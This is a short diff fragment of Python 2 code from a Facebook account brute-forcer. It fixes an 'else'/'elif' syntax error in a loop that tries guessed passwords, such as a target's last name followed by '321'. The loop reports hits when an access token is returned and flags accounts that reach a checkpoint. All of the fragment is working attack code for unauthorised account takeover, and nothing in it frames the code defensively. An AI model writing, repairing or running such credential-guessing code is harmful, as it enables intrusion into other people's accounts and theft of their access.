@@ -105,7 +105,7 @@ def brutefor():
                                                         js = json.load(dev)
                                                         if "access_token" in js:
                                                                 print "  Found : " + san6
-                                                        else "www.facebook.com" in js["error_msg"]:
+                                                        elif "www.facebook.com" in js["error_msg"]:
                                                                 print "  Cekpoint : " + san6
                                                         else:
                                                                 san7 = jsl["last_name"] + "321"
